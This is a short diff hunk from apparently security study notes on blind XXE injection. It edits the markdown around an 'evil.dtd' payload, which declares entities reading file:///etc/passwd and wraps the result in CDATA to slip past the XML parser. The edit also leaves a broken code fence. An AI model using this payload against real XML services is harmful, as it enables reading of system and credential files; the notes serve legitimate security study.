@@ -118,8 +118,8 @@ Result `XML` data:
 # Blind XXE injection with file content containing `<`
 * We will use `CDATA`, character data to bypass this.
 * Anything between `<![CDATA[ ` and `]]>` will not be parsed by the XML parser
-* `evil.dtd`:
-```xml
+* `evil.dtd`
+``xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
